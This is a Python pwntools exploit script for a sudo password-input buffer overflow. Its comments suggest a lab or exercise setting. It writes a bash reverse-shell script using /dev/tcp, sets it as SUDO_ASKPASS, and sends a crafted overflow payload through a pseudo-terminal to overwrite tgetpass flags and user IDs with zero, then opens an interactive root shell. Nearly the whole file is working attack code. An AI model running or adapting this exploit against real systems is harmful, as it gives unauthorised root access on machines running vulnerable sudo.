#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import os
import sys
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'debug')

# exploit config
reverse_shell_filename = '/tmp/reverse.sh'
reverse_shell_port = 30678

# sudo constant
TGP_ASKPASS = 0x4

# addresses (obtainted from gdb, used to calculate offsets)
buf = 0x558d3c7512c0
signo = 0x558d3c7513e0
tgetpass_flags = 0x558d3c7514e4
user_details = 0x558d3c751500

def main():
    with open(reverse_shell_filename, 'w') as f:
        f.write('#!/usr/bin/env bash\n bash -i >& /dev/tcp/127.0.0.1/{} 0>&1'.format(reverse_shell_port))
    os.system('chmod u+x {}'.format(reverse_shell_filename))

    port = listen(reverse_shell_port)

    mfd, sfd = os.openpty()
    fd = os.open(os.ttyname(sfd), os.O_RDONLY)

    proc = process(['/usr/bin/sudo', '-k', '-S', 'id'], env = {'SUDO_ASKPASS': reverse_shell_filename}, stdin = fd)
    log.info('You may attatch this process to gdb now.')
    input()

    # Develop your exploit here
    payload  = (b'\x00' + b'\x15') * (tgetpass_flags - buf)
    payload += p64(TGP_ASKPASS).ljust(user_details - tgetpass_flags, b'\x00')
    payload += p32(0)  # pid
    payload += p32(0)  # ppid
    payload += p32(0)  # pgid
    payload += p32(0)  # tcpgid
    payload += p32(0)  # sid
    payload += p32(0)  # uid
    payload += p32(0)  # euid
    payload += p32(0)  # guid
    payload += p32(0)  # egid
    os.write(mfd, payload + b'\n')

    port.wait_for_connection()
    port.interactive()


if __name__ == '__main__':
    main()
